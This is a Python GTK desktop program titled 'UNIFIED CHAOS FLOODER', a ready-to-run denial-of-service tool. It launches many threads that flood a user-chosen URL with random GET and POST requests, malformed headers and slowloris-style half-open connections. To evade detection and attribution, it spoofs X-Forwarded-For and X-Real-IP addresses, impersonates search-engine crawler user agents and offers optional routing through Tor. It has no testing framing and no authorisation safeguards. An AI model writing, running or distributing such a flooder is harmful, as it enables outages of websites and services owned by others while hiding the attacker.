import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GLib
import threading
import time
import random
import string
import requests
import socket

class ChaosFlooder(Gtk.Application):
    def __init__(self):
        super().__init__()
        self.flooding = False
        self.total_requests = 0
        self.total_errors = 0

    def do_activate(self):
        window = Gtk.ApplicationWindow(application=self)
        window.set_title("UNIFIED CHAOS FLOODER")
        window.set_default_size(600, 400)
        window.connect("destroy", Gtk.main_quit)

        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6, margin=10)

        self.url_entry = Gtk.Entry()
        self.url_entry.set_placeholder_text("Target URL (e.g., http://192.168.1.1)")
        box.pack_start(self.url_entry, False, False, 0)

        self.threads_entry = Gtk.Entry()
        self.threads_entry.set_placeholder_text("Number of Threads (e.g., 100)")
        box.pack_start(self.threads_entry, False, False, 0)

        self.use_tor_check = Gtk.CheckButton(label="Route via Tor (localhost:9150)")
        box.pack_start(self.use_tor_check, False, False, 0)

        start_button = Gtk.Button(label="START FLOOD")
        start_button.connect("clicked", self.start_flood)
        box.pack_start(start_button, False, False, 0)

        stop_button = Gtk.Button(label="STOP")
        stop_button.connect("clicked", self.stop_flood)
        box.pack_start(stop_button, False, False, 0)

        self.log_buffer = Gtk.TextBuffer()
        self.log_view = Gtk.TextView(buffer=self.log_buffer)
        self.log_view.set_editable(False)
        self.log_view.set_wrap_mode(Gtk.WrapMode.WORD)
        scrolled = Gtk.ScrolledWindow()
        scrolled.set_vexpand(True)
        scrolled.add(self.log_view)
        box.pack_start(scrolled, True, True, 0)

        window.add(box)
        window.show_all()

    def log(self, text):
        end_iter = self.log_buffer.get_end_iter()
        self.log_buffer.insert(end_iter, text + "\n")

    def update_status(self):
        GLib.idle_add(self.log, f"Requests: {self.total_requests} | Errors: {self.total_errors}")

    def start_flood(self, button):
        if self.flooding:
            return

        url = self.url_entry.get_text()
        try:
            num_threads = int(self.threads_entry.get_text())
        except ValueError:
            self.log("Invalid thread count.")
            return

        self.flooding = True
        self.total_requests = 0
        self.total_errors = 0
        self.base_url = url
        self.use_tor = self.use_tor_check.get_active()

        for _ in range(num_threads):
            thread = threading.Thread(target=self.chaos_worker, daemon=True)
            thread.start()

        self.log(f"🔥 CHAOS FLOOD STARTED with {num_threads} threads...")

    def stop_flood(self, button):
        self.flooding = False
        self.log("🛑 CHAOS FLOOD STOPPED.")

    def chaos_worker(self):
        session = requests.Session()
        if self.use_tor:
            session.proxies = {
                "http": "socks5h://127.0.0.1:9150",
                "https": "socks5h://127.0.0.1:9150"
            }

        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "curl/7.68.0", "Wget/1.20.3", "Googlebot/2.1",
            "Bingbot/2.0", "Slackbot-LinkExpanding", "FacebookExternalHit/1.1",
            "Twitterbot/1.0", "Mozilla/5.0 (Linux; Android 11)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5)",
            "Mozilla/5.0 (compatible; GPTBot/1.0; +https://openai.com/gptbot)"
        ]

        while self.flooding:
            try:
                attack = random.choice(["GET", "POST", "GARBAGE", "SLOWLORIS", "MALFORMED"])
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "X-Forwarded-For": self._rand_ip(),
                    "X-Real-IP": self._rand_ip(),
                    "Referer": f"http://{self._rand_str(8)}.com/",
                    "Connection": "keep-alive"
                }

                path = "/" + self._rand_str(12)
                full_url = self.base_url + path

                if attack == "GET":
                    session.get(full_url, headers=headers, timeout=5)
                    self._bump("GET " + path)

                elif attack == "POST":
                    data = {self._rand_str(4): self._rand_str(8) for _ in range(3)}
                    session.post(full_url, headers=headers, data=data, timeout=5)
                    self._bump("POST " + path)

                elif attack == "GARBAGE":
                    garbage_path = "/" + self._rand_str(24)
                    session.get(self.base_url + garbage_path, headers=headers, timeout=5)
                    self._bump("404 " + garbage_path)

                elif attack == "MALFORMED":
                    malformed_headers = headers.copy()
                    malformed_headers["X-Fake-Header"] = self._rand_str(128)
                    malformed_headers["X-"] = "??"
                    session.get(full_url, headers=malformed_headers, timeout=5)
                    self._bump("MALFORMED " + path)

                elif attack == "SLOWLORIS":
                    self._slowloris(self.base_url)
                    self._bump("SLOWLORIS")

            except Exception as e:
                self.total_errors += 1
                GLib.idle_add(self.log, f"⚠ Error: {e}")
                self.update_status()

    def _bump(self, tag):
        self.total_requests += 1
        GLib.idle_add(self.log, f"✔ {tag}")
        self.update_status()

    def _rand_str(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _rand_ip(self):
        return '.'.join(str(random.randint(1, 255)) for _ in range(4))

    def _slowloris(self, target_url):
        try:
            if target_url.startswith("http://"):
                host = target_url.split("://")[1].split("/")[0]
                port = 80
            elif target_url.startswith("https://"):
                host = target_url.split("://")[1].split("/")[0]
                port = 443
            else:
                host = target_url
                port = 80

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(f"GET /?{self._rand_str(5)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(b"User-Agent: chaos-bot\r\n")
            sock.send(b"Content-Length: 1000000\r\n")
            sock.send(b"Keep-Alive: 900\r\n")
            time.sleep(random.uniform(0.5, 1.5))
            sock.close()
        except:
            pass

def main():
    app = ChaosFlooder()
    app.run()

if __name__ == "__main__":
    main()
